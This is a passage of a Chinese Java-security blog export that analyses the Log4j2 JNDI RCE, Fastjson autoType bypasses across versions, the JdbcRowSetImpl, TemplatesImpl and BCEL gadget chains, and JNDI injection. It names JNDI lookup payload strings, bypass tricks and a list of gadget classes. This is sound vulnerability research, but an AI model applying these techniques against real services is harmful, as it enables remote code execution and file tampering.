环境中存在Commons-Collections依赖的话利用链就更多了，这里只使用了CC11的利用链"},{"title":"Log4j2反序列化利用与分析","date":"2023-08-09T04:30:08.081Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/91ba9d0d39fd.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Log4j2","/tags/Log4j2/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"基本概述Apache Log4j是一个流行的Java日志框架，用于将应用程序的日志输出到不同的目标，如文件、控制台或远程服务器。 2021年被爆存在远程代码执行漏洞，CVE漏洞编号为CVE-2021-44228，该漏洞可能导致远程代码执行，该漏洞的根本原因在于Log4j2中的一个特性，它允许开发人员通过特殊的日志消息来触发远程代码执行。具体来说，当Log4j2解析包含特定的JNDI（Java命名和目录接口）引用的日志消息时，它将尝试通过JNDI查找来获取对应资源的引用。攻击者可以构造一个恶意的JNDI引用，通过发送包含该引用的日志消息来触发远程代码执行。 影响版本2.0.0 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.14.0 JDK影响版本是根据JDK本身版本有关，高版本也存在被绕过风险 Log4j使用基础使用Log4j先引入依赖 在 resources 文件夹中新建 log4j2.xml 文件，用于配置log4j $&#123;&#125; 在Log4j中被称为变量插值，它是一种特殊的语法，用于在日志消息中引用和替换变量的值，通过在 $&#123;&#125; 中指定变量名称，Log4j可以动态地将变量的值插入到日志消息中 需要注意的是，在Log4j中使用变量插值时，变量的值可以从不同的来源获取，例如系统属性、环境变量、配置文件等。这使得Log4j可以根据不同的部署环境和配置文件进行灵活的日志定制 CVE-2021-44228调试分析 在 info 方法中，判断了是否开启了日志记录 调用了 logMessageSafely 方法，用于将日志安全的记录到日志文件中，确保不会记录日志消息时发生任何异常和错误，继续往下走 logMessageTrackRecursion 方法用于记录递归调用的日志信息，再继续往下走 tryLogMessage 方法尝试记录日志消息，分析切入点正是这里 在这个方法里其实就是调用了 log 方法，如果出现异常，则抛出异常，跟进 log 方法看一下 获取了 Logger 的日志记录器配置对象，再调用了 log 方法 在该方法中通过日志事件工厂对象 logEventFactory 创建了一个Log4j日志事件对象，并作为参数调用了 log 方法，继续往下走 这里调用 processLogEvent 方法处理日志事件 这里就是对日志事件的输出目标附加器进行遍历，我们再来看下在 callAppender 方法中做了什么 shouldSkip 方法用于控制和判断日志事件是否被过滤或是否存在递归调用，随后调用了 callAppenderPreventRecursion 预防递归调用附加器方法 到了这里尝试对Log4j日志事件对象调用附加器，继续跟进 这里将日志事件对象添加到 ConsoleAppender 附加器中 append 方法中调用了 tryAppend 方法，在该方法中判断了是否开启了直接编码器，默认是开启的，调用 directEncodeEvent 方法 在这里获取了日志事件布局，在日志事件布局中包含输出的格式、日期、日志级别、消息内容等信息，再调用了日志事件布局对象的 encode 方法 调用 toText 方法将日志事件序列化为字符串 在该方法中调用序列化器的 toSerializable 方法，serializer 其实就是模式序列化器，有如下的模式格式化器： 我们需要关注是 MessagePatternConverter 消息格式转换器，因为只有这一格式转换器是我们可控的，也就是一开始传入的参数 message，我们跟进一下toSerializable方法 这里其实就是对模式序列化器进行遍历格式化调用 format 方法，我们的关注点是在 MessagePatternConverter 中，所以跳过无关紧要的格式转换器，直接到索引为8的 PatternFormatter 模式格式化器 format 方法中看做了什么 调用了转换器的 format 方法，目前的转换器是 MessagePatternConverter msg 对象中的 message 就是我们一开始传入参数的日志消息，随后将 msg 对象强转成 StringBuilderFormattable 类型再调用了 formatTo 方法 workingBuilder 对象存放的就是日志输出的前缀信息 这里其实就是将 message 内容追加到 workingBuilder 中 noLookups 默认为false，这里对 workingBuilder 内容进行遍历，判断第一个字符和第二个字符是否分别为 $ 和 &#123; 符号，value 变量就是截取的字符串 $&#123;jndi:ldap://127.0.0.1:8085/kOXQHHlE&#125;，接着设置 workingBuilder 的长度为 offset，并追加内容为 config.getStrSubstitutor().replace() 方法的返回值 replace 方法中调用了 substitute 方法 substitute 方法的前面部分主要是获取了变量的前缀和后缀匹配器，前缀匹配器为 $ 和 &#123;，后缀匹配器为 &#125;，再获取了转义特殊字符的转义字符也就是 $ 和分隔符匹配器 : 和 -，接着就是把 buf 对象转换为字符数组，从0开始循环一直到这个字符串的长度38为止，然后依次循环匹配是否到前缀匹配器，前两个就匹配到了，返回值不是0所以走else语句 接着就是继续循环查找后缀匹配器 bufName 变量就是去掉前缀和后缀匹配器后的字符串，然后再调用了 substitute 方法 还是到了这个方法里，再重复上面的操作，一直找前缀匹配器找不到，后面接着查找分隔符匹配器也没有找到，然后就是调用 resolveVariable 方法解析变量 在该方法里获取了变量解析器，解析器支持的Lookup如上图所示 对 var 的字符串以 : 分割，获取了后面的内容，并且获取字符串的前缀 jndi，再从 StrLookupMap 对象中查找对应的 Lookup 类，接着就是调用了 JndiLookup 类的 lookup 方法 然后就是获取了默认的JNDI管理器，通过该管理器调用 lookup 方法 这里就是调用了原生的 lookup 方法，后面就是JNDI注入了，执行了恶意ldap服务上的恶意代码，最终成功执行 Payload变形绕过WAF 参考链接 "},{"title":"Fastjson后续版本绕过分析","date":"2023-08-03T08:12:01.322Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/13f085f1e890.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Fastjson","/tags/Fastjson/"],["alibaba","/tags/alibaba/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"fastjson&lt;&#x3D;1.2.25版本绕过fastjson1.2.25对之前的反序列化漏洞进行了修复，引入了 checkAutoType 机制，默认 autoTypeSupport 没有进行设置，是false，不能反序列化任何类，若开启，也会根据黑名单来判断是否能够反序列化 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.41 fastjson1.2.25以后版本，在 com.alibaba.fastjson.parser.ParserConfig 类中增加了以下的安全机制 autoTypeSupport 变量用来表示是否支持反序列化任意类，默认为false denyList 变量是反序列化类全限定类名前缀的黑名单 acceptList 变量是反序列化类全限定类名前缀的白名单 白名单 acceptList 默认是空的，黑名单 denyList 包含以下关键字 开启 autoTypeSupport 的方法： 在代码中设置 ParserConfig 类对应的属性 添加白名单的方法： 在代码中设置 ParserConfig 类对应的属性 新建 fastjson.properties 文件添加对应属性设置 修复方案分析 DefaultJSONParser 类中新增加调用 config.checkAutoType 方法 checkAutoType 方法前面主要是判断如果开启了 autoTypeSupport 那么就从看看白名单有没有允许反序列化类全限定类名前缀，再从黑名单中看看反序列化类的全限定类名前缀是不是在黑名单内，在黑名单内的话就抛出异常。这里我debug时，提前开启了 autoTypeSupport 才能走到这里，否则执行到下面就抛出异常了 若没有开启 autoTypeSupport，这里先判断反序列化类的全限定类名前缀是否在黑名单内，再判断是否在白名单内，在白名单内就允许加载类，这样就让攻击者进行反序列化攻击更难了 绕过分析这里只考虑开启 autoTypeSupport 的情况，使用JdbcRowSetImpl链来利用 可以看到在 TypeUtils 类中的 loadClass 方法中，判断了全限定类名是否是以 L 开头和 ; 结尾的，那么这里可以想一想，在前面判断了我们JSON字符串中的全限定类名前缀在不在黑名单内，那么我们在全限定类名的最开头加上 L 结尾加上 ;，这样在黑名单时检查不到，到了这里也能正常加载类，这样就可以绕过了 这样就成功躲过了黑名单检测，并且还能正常加载类 fastjson&lt;&#x3D;1.2.42版本绕过fastjson1.2.42版本对之前的1.2.25版本绕过进行了修复，虽然还是黑白名单检测，但是开发者将这些黑白名单校验改为黑白名单的HASH校验，且对开头以 L 和 结尾以 ; 的绕过方法进行了修复 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.42 修复方案分析 在 com.alibaba.fastjson.parser.ParserConfig 类中，将明文黑白名单转成了HASH黑白名单 在 checkAutoType 方法中多了判断 className 全限定类名是否是以 L 开头 ; 结尾，如果是则去除掉 然后再将 className 转hashcode，将这个hashcode去白名单和黑名单hashcode比较，这样好像是解决了fastjson1.2.25版本的绕过问题了 绕过分析先给出绕过的POC，其实就是双写 L 和双写 ; 问题出在这里，这里只是进行了一次截取，我们只需要双写 L 和 ; 即可绕过 fastjson&lt;&#x3D;1.2.43版本绕过fastjson1.2.43版本修复了fastjson 1.2.42版本的双写绕过问题 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.43 修复方案分析 这里对双写的 L 和 ; 进行了判断，如果是则抛出异常 绕过分析 问题是出在 TypeUtils 类中，判断以 L 开头和 ; 结尾的方法已经不能用了，但是不仅仅只有这个条件才可以类加载，在上面一个条件判断以 [ 开头的也是可以进行类加载的 而在后续调用到 parseArray 方法，其中也判断了当前的 token 值是否是14，不是的话就抛出异常了，导致后续不能进行JNDI注入，那么只需要在获取完类名以后接着跟上一个 [ 再跟上一个 &#123;，这样就绕过了 fastjson&lt;&#x3D;1.2.45版本绕过在fastjson1.2.44版本中修复了1.2.43版本的绕过问题，在 具体影响范围：1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.45 修复方案分析 在fastjson1.2.44版本中，checkAutoType 方法中判断了className的第一个字符如果是 [ 就抛出异常 绕过分析这里的绕过就是在fastjson1.2.44版本修复了1.2.43的绕过后，基于黑名单的绕过 黑名单不能保证所有可利用的类都能添加到黑名单，jackson 也是基于黑名单的方式，也是可以参考 jackson 的黑名单绕过来绕过fastjson的 由于这个利用的类是mybatis依赖中的，所以利用这个类需要mybatis依赖 fastjson&lt;&#x3D;1.2.47版本绕过在fastjson1.2.47版本，可以不用开启 AutoTypeSupport 即可进行反序列化 具体影响版本： 1.2.25 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.32（AutoTypeSupport未开启） 1.2.33 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.47 绕过分析 问题出在这里，如果我们没有开启 autoTypeSupport 也没有期望类 expectClass，那么就会从 TypeUtils.mappings 中查找 我们查找下是哪个地方可以调用 mappings.put() 方法，在 TypeUtils 类 loadClass 方法调用了 在 MiscCodec 类中的 deserialze 反序列化方法中调用了 TypeUtils.loadClass 方法 checkAutoType 方法中如果在 mappings 中查找不到我们传入的类，那么就会从类型为 IdentityHashMap 类型的反序列化器中查找，这里我们传入类名 java.lang.Class 的原因是这个类名在反序列化器中的反序列化器是 MiscCodec 通过了 checkAutoType 的校验，再到后面就获取了反序列化器的类，那么只要后面调用了这个反序列化器的反序列化方法，就会调用前面的 TypeUtils.loadClass 类加载方法，那么我们跟进看下这个反序列化方法做了什么 在 MiscCodec 类的 deserialze 方法中就是获取了下一个键值对，而且下一个键值对键必须是 val 字符才可以，否则就抛出异常了 然后就是获取了键值对的值了，这里是我们想要加载类的类名 这里使用了AppClassLoader将需要利用的类进行加载，并且把需要利用的类名和加载好的类放进了 mappings，当我们给的JSON字符串有两个键值对，第一个按照上面的方法，把我们需要利用的类给放进 mappings，后面的键值对正常利用即可，按照这个思路，我们写出POC JSON字符串的 a 键值对负责将我们需要利用的类放入 mappings，而 b 键值对就是直接利用该类进行攻击即可 当进行下一个键值对的解析时进入 checkAutoType 方法，传入需要利用的类名 走到下面，从 mappings 获取我们传入的类名就可以找到了，然后返回了这个类 fastjson&lt;&#x3D;1.2.80绕过分析在fastjson1.2.48版本修复了1.2.47版本的绕过，在fastjson1.2.68开始更新了一个 safeMode 控制，如果开启了 safeMode 在调用 checkAutoTyep 方法时就会抛出异常 具体影响版本：1.2.68 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.80 修复方案分析 MiscCodec 类中调用 TypeUtils.loadClass 默认cache缓存为false，这样就避免了在fastjson1.2.47版本的绕过 绕过分析 在 checkAutoType 方法中，如果开启了 safeMode 这里就直接抛出异常了 如果 expectClass 期望类有入参，且传入的类名是 expectClass 的子类或实现类，那么就可以通过 checkAutoType 的检查 经过查找，发现只有 JavaBeanDeserializer#deserialze 和 ThrowableDeserializer#deserialze 方法中 expectClass 是可控的 写出POC如下： java.lang.Exception 是期望类，由于在 mappings 缓存中是存在 java.lang.Exception 类的，可以获取到这个类且是期望类，这里返回了这个类 这里就是调用了 java.lang.Exception 的反序列化器 ThrowableDeserializer 的 deserialze 方法，deserClass 则是 Throwable.class 这里加载了我们的恶意类，并添加到了 TypeUtils.mappings 中 exClass 就是我们的恶意类，调用了 createException 方法，跟进这个方法看一下做了什么 这里默认构造器就是恶意类的构造器，通过这个构造器实例化了恶意类即执行了恶意命令 最后，执行了恶意类的代码。需要注意的是，这里我们在本地进行测试时，写了一个本地的恶意类进行加载，目前没有一个完整的利用链 反序列化链PayloadJdbcRowSetImpl TemplatesImpl JndiDataSourceFactory SimpleJndiBeanFactory DefaultBeanFactoryPointcutAdvisor WrapperConnectionPoolDataSource JndiRefForwardingDataSource InetAddress Inet6Address URL JSONObject URLReader AutoCloseable 任意文件写入 BasicDataSource JndiConverter JtaTransactionConfig JndiObjectFactory AnterosDBCPConfig AnterosDBCPConfig2 CacheJndiTmLookup AutoCloseable 清空指定文件 AutoCloseable 清空指定文件 AutoCloseable 任意文件写入 AutoCloseable MarshalOutputStream 任意文件写入 BasicDataSource HikariConfig HikariConfig SessionBeanProvider JMSContentInterceptor ContextClassLoaderSwitcher OracleManagedConnectionFactory JNDIConfiguration JDBC4Connection LoadBalancedMySQLConnection UnpooledDataSource LoadBalancedMySQLConnection2 ReplicationMySQLConnection"},{"title":"Fastjson<=1.2.24反序列化分析","date":"2023-07-18T07:41:50.063Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/11c62fd672b4.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Fastjson","/tags/Fastjson/"],["alibaba","/tags/alibaba/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"影响版本最早在fastjson1.2.24及之前的版本被曝存在远程代码执行漏洞，由于fastjson可以使用 @type 指定反序列化任意类，攻击者可在jdk包中查找能够构造出恶意类的方法，在其反序列化时会调用其getter或setter方法。 具体影响范围：1.2.22 &lt;&#x3D; fastjson &lt;&#x3D; 1.2.24 JdbcRowSetImpl利用链com.sun.rowset.JdbcRowSetImpl 这条利用链是比较简单的，该类提供对数据库连接的操作，由于提供了JNDI的支持且参数可控，导致出现JNDI注入。 根据上一篇FastJson反序列化分析中，我们已经知道会自动调用带有 @type 的json字符串中的属性setter方法。我们又知道，在 JdbcRowSetImpl 类中存在一个参数可控的JNDI注入 在该类中搜索一下，在这个地方进行了JNDI查找操作 继续查找 getDataSourceName 方法，返回了 BaseRowSet 类中的 dataSource 属性，由于 JdbcRowSetImpl 继承了 BaseRowSet 类，那么我们看一下是哪个方法对 dataSource 进行了赋值 在 JdbcRowSetImpl 类中，获取了 getDataSourceName 的值，这就是为什么我们在json字符串中先把 dataSourceName 放在前面，因为首先会先调用到 setDataSourceName 方法，如果反过来可能会导致空指针的报错 所以会执行到 super.setDataSourceName 方法，调用了父类的 setDataSourceName 方法 来到了父类的这个方法，其实就是判断是否为空，这就是我们传入的 ldap://127.0.0.1:8085/lovxJNmO 这个字符串，再然后就进行了赋值的操作。 和上面我们说的已经对上了，现在 dataSource 就是我们的恶意ldap服务，现在只需要调用 connect 方法即可执行恶意代码。 经过查找，发现 setAutoCommit 方法调用了 connect 方法，而 getDatabaseMetaData 方法是getter方法且没有参数，这个不适合我们去利用。 这样就查找了恶意的ldap服务执行了恶意代码，走到了JSONException这里是因为没有设置 Feature.SupportNonPublicField 参数，报错但不影响执行。 TemplatesImpl利用链com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这条利用链需要启用 Feature.SupportNonPublicField 对非公开字段的反序列化的访问。 在编写恶意类时，该恶意类必须继承 AbstractTranslet，至于为什么需要继承该类，到后面分析自然就知道了。还需要将恶意类编译生成的.class文件进行Base64编码，因为在利用过程中会对 _bytecodes 进行Base64解码，具体看后面分析。 这里判断了字符串的第一个字符的token为左大括号，则实例化了一个JSON对象 这里 isObjectKey 为false且设置key变量值为@type，判断了当前JSON解析器解析字符串的字符，到这里其实就是到了上图这个位置了 这里就是对 isObjectKey 值取反判断，执行 lexer.next() 获取下一个词法单元（符号）也就是双引号字符（”），再后面就是调用 lexer.scanSymbol() 方法从解析器中读取字符，直到遇到第二个引号字符（”）为止，这样的话就获取到了com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 这个字符串，接着调用 TypeUtils 类的loadClass静态方法加载TemplatesImpl类，TypeUtils类的loadClass静态方法其实主要就是做了判断ParserConfig类中的默认加载器是不是为null，为null的话就使用AppClassLoader加载器进行加载并返回加载后的类 lexer.nextToken(JSONToken.COMMA) 获取下一个标记，下一个标记是JSONToken.COMMA 常量，对应的字符是 , 逗号，下一个标记确实是 , 逗号，接着判断下一个词法单元（符号）是不是右大括号，很显然不是，则继续往下看 通过ParserConfig类config对象获取com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 的反序列器并调用反序列化器的序列化方法 进入了反序列化方法后，前面都是一些赋值判断的操作，到了这里其实就是将 sortedFieldDeserializers 字段反序列化器数组进行一个遍历，第一次遍历获取的是 outputProperties 字段 这里就是判断了 outputProperties 字段是什么类型的，再跟下去 跟下去发现下面的所有判断都不符合，直接进入第二次循环，这次是 stylesheetDOM 字段下面的判断也是不符合的，进入第三次循环也是不符合判断要求，这里就不详细看了 再往下就是到了这里，由于上面三次都没有符合判断要求，所以matchField为false，这里开始判断key的值是否一致 上面判断也不符合要求，到了这里，将JSON解析器和&#96;&#96;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl类作为createInstance&#96; 方法的参数创建实例，跟进看一下 这里就是获取了 TemplatesImpl 类的默认构造器，如果这个默认构造器参数数量为0的话，那就通过这个默认构造器进行实例化对象并返回 接着解析器获取了下一个key，后面就是解析我们传入的JSON字符串字段 _bytecodes、_name、_tfactory、_outputProperties 的操作 只有当key为 _outputProperties 时，才能获取到字段反序列化器，前面的操作都是各种判断JSON解析器细节方面的东西，随后调用parseField方法，跟进看一下 parseField方法主要是获取字段反序列化器，由于 _bytecodes、_name、_tfactory 这些私有字段在TemplatesImpl类中都没有对应的public修饰符的getter和setter方法，所以没有字段反序列化器，而 _outputProperties 私有字段有对应public修饰符的getter方法，那么它就拥有一个字段反序列化器 这里有一个注意的地方，就是key为 _bytecodes 时和 _outputProperties 的区别 这里对字段值反序列化器进行反序列化获取值，这里要注意的是在前面key为 _bytecodes 时，会调用到 ObjectArrayCodec 类中的 deserialze 方法，该类对JSON字符串数组进行了一个解析，将JSON字符串数组进行了Base64解码，所以在写Payload时需要将 _bytecodes 键的值进行Base64编码 当key为 _outputProperties 时，会调用 MapDeserializer 类的 deserialze 方法，这个key是没有设置值的，所以这里返回null setValue方法判断了getOutputProperties方法字段访问权限和字段类 这里判断了 getOutputProperties 方法的返回值类型是否是Map类或Map子类，该方法返回值类型是 Properties，该类型是Map的子类，后面就是使用反射调用TemplatesImpl类的 getOutputProperties 方法 在 getOutputProperties 方法中调用了 newTransformer 方法，跟进看一下 这里调用了 getTransletInstance 方法，再跟进看一下 getTransletInstance 方法中判断了json字符串的 _name 和 _class 是否为空，这样就是为什么在payload中json字符串中必须要设置_name变量的值，不设置值这里就直接返回null了，_class 变量我们没有设置，即调用 defineTransletClasses 方法 这里还需要注意到一点的是 _tfactory 在JSON字符串中必须存在键值对，可以是空值，但不能没有，否则没有办法实例化 TransletClassLoader 加载器 _bytecodes 也不能为null，否则就抛出异常了。接着就是获取TransletClassLoader，通过 TransletClassLoader.defineClass() 方法将json字符串中的 _bytecodes 变量恶意代码字节码值转换成一个类实例，然后判断了我们恶意代码类的父类全限定类名是否包含 ABSTRACT_TRANSLET 常量值 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet，这就是为什么要在恶意类中需要继承 AbstractTranslet 类的原因，如果没有继承，则 _transletIndex 变量为-1，再走到下面 _transletIndex 小于0就会抛出异常了，所以必须要让恶意类继承 AbstractTranslet 类 _class 数组里下标为0的就是通过 TransletClassLoader 加载器加载的恶意类，调用 newInstance 方法即可实例化恶意类对象，即执行恶意类的代码，弹出计算器 BCEL利用链BCEL链也是一种不出网的利用链，虽然 TemplatesImpl 利用链也是不出网的利用链，但是这个利用链很苛刻，需要开启 Feature.SupportNonPublicField 对非公开字段的支持。BECL利用链需要tomcat的依赖tomcat-dbcp，对于Tomcat8.0之前版本使用 org.apache.tomcat.dbcp.dbcp.BasicDataSource，Tomcat8.0之后使用 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 我们先来看下BCEL这条链的触发点在哪里，org.apache.tomcat.dbcp.dbcp2 包下的DriverFactory 类中，createDriver 静态方法使用 BasicDataSource 类型对象的 driverClassLoader 加载器加载了BasicDataSource类型对象的 driverClassName driverClassLoader 是我们在JSON字符串中写的是com.sun.org.apache.bcel.internal.util.ClassLoader 这个类，那么就会调用ClassLoader该类中的 loadClass 方法，在这个方法中判断了 class_name 是否是 $$BCEL$$ 字符开头的，否则就会抛出异常了，接着后面调用了 createClass 方法，这个方法就是将 class_name 中的字节码转换成类 在 createClass 方法中，将 $$BCEL$$ 字符删除后进行解码，再对这个解码后的字节码进行解析，所以在JSON字符串中 driverClassName 键的值需要进行编码 后面就是对解析后的类再进行一些处理，再将这个类进行返回 再获取这个类的字节码，加载成一个具体的类 使用自定义加载器 com.sun.org.apache.bcel.internal.util.ClassLoader 加载完成后得到的具体恶意类进行了实例化，这里是真正进行执行恶意代码的地方，我们再看下是这个调用链是什么样的 这里就是一个完整的调用链 getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;DriverFactory.createDriver() 我们清楚这条链的触发点后，至于前面的 parse 方法解析JSON字符串，在Fastjson反序列化一开始我们就已经跟着程序调试分析了，就是去根据我们给的JSON字符串去解析成对应的对象，接着调用 toJSON 方法 这里会将传入的类名 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 的序列化器转换成JavaBean序列化器，使用该JavaBean序列化器获取获取所有字段值 这里就是对 BasicDataSource 类型对象的所有getter方法获取属性值，再看下 getPropertyValue 方法做了什么 这里调用了 fieldInfo 的 get 方法 这个get方法使用反射进行了方法的调用 那么这里只需要 getter 的变量值是 connection ，就会调用 getConnection 方法，这样我们这条完整的链就通了 但是我们发现不只是 getConnection 方法调用了 createDataSource 方法， getLogWriter 方法同样也调用了，而在解析对象时，在 FieldSeriailzer 对象数组类型的 sortedGetters 变量中，connection 相对于 logwriter 而言排在最前面，所以最先执行的也是这个方法，这就是为什么网上的文章都在说 getConnection 方法而没有说 getLogWriter 方法的原因 最后依次往下执行，成功执行了恶意代码"},{"title":"Fastjson反序列化分析","date":"2023-07-17T08:37:22.000Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/1f78acdc2202.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["Fastjson","/tags/Fastjson/"],["alibaba","/tags/alibaba/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"简介FastJson是Java的一个库，它可以将Java对象转换成JSON字符串，也可以将JSON字符串转换成Java对象 回显Fastjson使用版本在实战中如果不知道使用的是什么版本的Fastjson，可以将请求包中的 Content-Type 改成字段内容改成 application/json，请求体中让后端报错，比如 [&#123;&quot;a&quot;:&quot;a\\x] FastJSON使用 FastJSON提供了特殊字段@type，该字段可以指定反序列化任意类，会自动调用其类属性的特定的set、get方法。 在反序列化时，public修饰符的属性会被反序列化赋值，private修饰符的属性不会直接的进行反序列化赋值而是通过setXxx的方法进行赋值。 Fastjson反序列化流程分析根据这一特性，我们可以自己写一个类来测试一下，这里我在Person2类中定义了私有的属性_name，所以 set 和 get 方法都是小写加_ 程序从这开始将json字符串给Fastjson去解析 我们来到这里，parseObject 有好几个重写方法，目前我们先熟悉一下Fastjson反序列化整个流程，后面遇到再说。 这个 pareObject 调用的是另一个重写方法的 pareObject 这里还是调用了另一个重写的 pareObject 方法，继续跟进 DefaultJSONParser 将我们输入的json字符串和全局解析配置创建了一个默认JSON解析器。 再往下走，这个默认JSON解析器调用了 pareObject 方法 这里在反序列化器中尝试获取我们写的Person2类的反序列化器，很显然是没有的。 随后调用了 getDeserializer 方法，再跟进看一下 在这里就是获取我们的Person2这个类的全类名，有个替换操作，然后再判断我们的这个类名在不在黑名单（拒绝生成反序列化器列表）内，这个列表里只有一个 java.lang.Thread，当然也是不在的。 再往下走，走到了调用 createJavaBeanDeserializer 方法这里，看似是要创建一个JavaBean的反序列化器，继续跟进看一下。 这里获取Person2类上的JSONType注解，我们没有使用该注解，所以返回null 再继续往下跟，发现这里实例化了 JavaBeanDeserializer 类 进入 JavaBeanDeserializer 类，发现调用自己的另一个重写的构造方法。 这里的操作其实就是获取所有的 set 方法，由于我们这里只有一个 set 方法，就继续往下看了。 此时， createJavaBeanDeserializer 方法已经执行完毕了，使用 putDeserializer 把Person2类作为键，获取的JavaBean反序列化器作为值存到 ParserConfig 中的 derializers 变量中，该变量是一个HashMap，随后返回了这个JavaBean反序列化器。 这里也返回了反序列化器 继续往下走，可以看到反序列化器调用了 deserialze 反序列化方法。 走到这里条件符合，是默认的TYPE KEY（@type） 这里判断token是否等于JSONToken.RBRACE，JSONToken.RBRACE也就是 &#125; 符号，符合条件调用了 lexer 的 nextToken 方法，继续下一次循环。 此时，key是 _name 也就是json字符串中的键名，已经不是默认的TYPE KEY（@type）了。 再往下走，到这里调用了 createInstance 方法，跟进看一下 它获取了JavaBean反序列化器的默认构造方法并且实例化了，返回了一个对象。 这里已经得到了一个Person2类的对象了，object 自然不是null 再往下，调用了 parseField 方法，看这个名字应该是解析字段，跟进看一下。 这一连串的操作是处理字段中的 _ 和 - 符号，再通过 getFieldDeserializer 方法就获取对应的字段反序列化器了。 后面调用这个字段反序列化器的 parseField 方法，继续跟进 可以看到这里调用了 setValue 方法，参数 object 正是我们的Person2实例化出来的对象，value 则是71行反序列化获取的 _name 键的值，看看 setValue 方法里面是在干嘛。 这里判断了 fieldInfo 的method方法是不是只有一个get方法，很显然不是。 再继续往下，好像有点意思了，这里是真正调用 set_name 方法的地方，调用method的invoke方法，method是 set_name 方法，那么正好，我们只需要在Person2类中定义一个对应字段的setter方法，其方法有一个参数即可。value 就是 set_name 方法需要传入的参数，也就是执行的命令。 这里，就弹出了计算器了，说明触发点是在这里。 好了，现在我们已经理清楚了Fastjson整个反序列化流程，接下来我们需要配合一些JDK内的一些链来利用。"},{"title":"Java JNDI注入","date":"2023-05-29T02:44:18.229Z","url":"/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/eb4dd4b8a731.html","tags":[["Java安全","/tags/Java%E5%AE%89%E5%85%A8/"],["JNDI","/tags/JNDI/"]],"categories":[["Java安全,技术分享","/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"]],"content":"基本概念 Java的JNDI（Java Naming and Directory Interface）是一种标准API，可用于访问和管理分布式应用程序中的命名和目录服务。 JNDI为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。 通过JNDI，Java应用程序可以： 查找和获取命名对象，例如数据库连接、远程对象和配置信息。 将对象绑定到名称下，并使用这些名称来查找对象。 访问基于目录的服务，例如LDAP（Lightweight Directory Access Protocol）或者 DNS（Domain Name System）服务。 实现自定义的命名代理，并且根据需要将其集成进JNDI体系结构中。 JNDI主要支持：DNS、RMI、LDAP、CORBA等服务，JNDI类似一组API接口，每个对象都有一组名字和对象绑定关系，通过查找名字即可检索到相关的对象。 名词解释Reference类Reference类表示对存在于命名&#x2F;目录系统以外的对象的引用。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。 几个比较关键的属性： className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file&#x2F;ftp&#x2F;http等协议； Naming命名服务是一种键值对的绑定，使应用程序可以通过键检索值。 Directory目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。 JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。 ObjectFactoryObject Factory用于将Naming Service（如RMI&#x2F;LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。 影响版本 协议 JDK6 JDK7 JDK8 JDK11 LADP 6u141之前版本6u211之前版本 7u201之前版本7u131之前版本 8u121之前版本8u191之前版本 JDK11.0.1之前版本 RMI 6u45之前版本6u141之前版本6u211之前版本 7u21之前版本7u131之前版本7u201之前版本 8u121之前版本8u191之前版本 无 JNDI注入RMI Reference攻击对照影响版本，在影响版本JDK6、JDK7、JDK8的这些之后的版本，默认将下面两个属性设置为false，将不能再被利用，被设置了其如下的属性，想要修改属性必须设置其系统属性 com.sun.jndi.rmi.object.trustURLCodebase java.rmi.server.useCodebaseOnly com.sun.jndi.cosnaming.object.trustURLCodebase 恶意服务端代码如下： 受害者服务端 lookup 参数可控导致可以查找恶意服务RMI 编写一个exp.java程序用于弹出计算器，将该程序进行编译，再在当前目录下开启一个web服务 